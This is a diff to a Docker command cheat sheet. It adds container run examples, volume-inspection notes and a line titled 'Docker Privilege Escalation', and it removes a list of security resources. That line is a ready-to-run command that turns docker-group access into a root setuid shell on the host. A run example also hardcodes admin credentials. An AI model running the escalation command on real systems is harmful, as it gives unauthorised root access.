@@ -7,6 +7,10 @@ INSTALLATION
 	sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common && curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - && sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable" && sudo apt-get update && sudo apt-get install docker-ce docker-ce-cli docker-compose docker-registry vim-syntax-docker sen
 	OR, meanwhile on Kali Linux:
 	curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - && echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list && apt-get update && sudo apt-get install docker-ce docker-ce-cli docker-compose docker-registry vim-syntax-docker sen
+
+Test Docker
+docker run -it hello-world
+	--test Docker and connection to DockerHub
 	
 
 Lifecycle
@@ -16,6 +20,11 @@ docker rename
 	allows the container to be renamed
 docker run
 	creates and starts a container in one operation
+docker run -d --name ct -p 3000:3000 -e AUTH='h8admin:h8p4ss' -v dl:/downloads
+	-d daemon mode
+	--name containter name
+	-e AUTH="" enable authentication and set details
+	-v mapping a volume to a directory in the container
 docker rm
 	deletes a container
 docker update	
@@ -169,6 +178,11 @@ docker volume rm
 docker volume ls
 docker volume inspect
 
+Volume Sharing
+docker volume inspect vol
+	--"Mountpoint" field value will be location of mounted "disk" on localhost
+cd $Mountpoint to interact with target data
+
 
 Exposing ports
 docker run -p 127.0.0.1:$HOSTPORT:$CONTAINERPORT --name CONTAINER -t someimage
@@ -299,16 +313,12 @@ Define and run a user in your Dockerfile so you don't run as root inside the con
 RUN groupadd -r user && useradd -r -g user user
 USER user
 User Namespaces
-There's also work on user namespaces -- it is in 1.10 but is not enabled by default.
 
-To enable user namespaces ("remap the userns") in Ubuntu 15.10, follow the blog example.
 
-Security Videos
-Using Docker Safely
-Securing your applications using Docker
-Container security: Do containers actually contain?
-Linux Containers: Future or Fantasy?
-Security Roadmap
-The Docker roadmap talks about seccomp support. There is an AppArmor policy generator called bane, and they're working on security profiles.
+Docker Privilege Escalation:
+echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
+
+
+
 
 https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines
